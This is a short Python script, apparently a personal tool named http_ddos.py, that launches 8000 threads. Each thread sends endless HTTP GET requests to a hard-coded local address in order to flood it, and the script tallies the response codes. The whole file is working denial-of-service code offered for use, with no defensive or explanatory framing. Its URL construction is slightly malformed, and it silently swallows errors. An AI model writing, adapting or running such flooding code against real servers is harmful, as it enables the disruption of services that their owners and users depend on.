#!/usr/bin/python
# -*- coding: UTF-8 -*-
__author__ = "HeliantHuS"
__version__ = "1.0"
"""
@ Author: HeliantHuS
@ Codes are far away from bugs with the animal protecting
@ Time:  2019/7/18
@ FileName: http_ddos.py
"""
import requests
import threading

status = {"200": 0, "404": 0, "500": 0}
is_exit = False
class HttpRequest(threading.Thread):
    def __init__(self, url, port=80) -> None:
        super().__init__()
        global status
        self.url = url
        self.port = port


    def run(self) -> None:
        global status
        while True:
            try:
                response = requests.get(f"{self.url}:{self.port}", timeout=3).status_code
                status[str(response)] += 1
                print(status)
            except:
                pass

if __name__ == '__main__':
    for i in range(8000):
        t = HttpRequest("http://192.168.1.80/")
        t.start()

